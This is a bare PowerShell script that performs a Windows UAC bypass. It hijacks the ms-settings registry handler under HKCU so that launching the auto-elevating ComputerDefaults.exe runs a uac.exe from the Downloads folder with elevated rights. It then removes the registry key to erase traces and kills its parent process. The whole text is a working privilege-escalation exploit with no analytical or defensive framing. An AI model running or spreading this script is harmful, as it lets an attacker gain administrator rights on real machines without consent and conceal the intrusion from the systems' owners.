New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../Users/$Env:UserName/Downloads/uac.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
Start-Sleep -Milliseconds 1000
Remove-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Recurse -Force
$currentProcess = Get-Process -Id $PID
$parentProcess = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = '$($currentProcess.ParentProcessId)'"
if ($parentProcess) {
    Stop-Process -Id $parentProcess.ProcessId -Force
}
